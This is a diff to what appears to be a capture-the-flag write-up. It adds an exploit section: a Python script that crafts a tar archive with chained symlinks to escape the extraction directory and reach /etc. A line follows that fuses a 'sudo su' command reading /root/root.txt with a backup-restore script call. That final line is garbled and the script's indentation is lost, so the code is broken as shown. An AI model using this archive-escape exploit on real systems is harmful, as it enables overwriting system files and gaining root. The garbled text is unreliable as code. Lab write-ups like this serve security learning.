@@ -1122,9 +1122,37 @@ if __name__ == "__main__":
 <br>
 </div>
 
-#### 5.1.3 Designing the Exploit
+#### 5.1.3 The Exploit
 
-
+```python
+import tarfile  
+import os  
+import io  
+import sys  
+comp = 'd' * 247  
+steps = "abcdefghijklmnop"  
+path = ""  
+with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:  
+for i in steps:  
+a = tarfile.TarInfo(os.path.join(path, comp))  
+a.type = tarfile.DIRTYPE  
+tar.addfile(a)  
+b = tarfile.TarInfo(os.path.join(path, i))  
+b.type = tarfile.SYMTYPE  
+b.linkname = comp  
+tar.addfile(b)  
+path = os.path.join(path, comp)  
+linkpath = os.path.join("/".join(steps), "l"*254)  
+l = tarfile.TarInfo(linkpath)  
+l.type = tarfile.SYMTYPE  
+l.linkname = "../" * len(steps)  
+tar.addfile(l)  
+e = tarfile.TarInfo("escape")  
+e.type = tarfile.SYMTYPE  
+e.linkname = linkpath + "/../../../../../../../etc"  
+tar.addfile(e)  
+sudo su - -c "cat /root/root.txt"backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_evil &&
+```
 
 
 <div align="center">
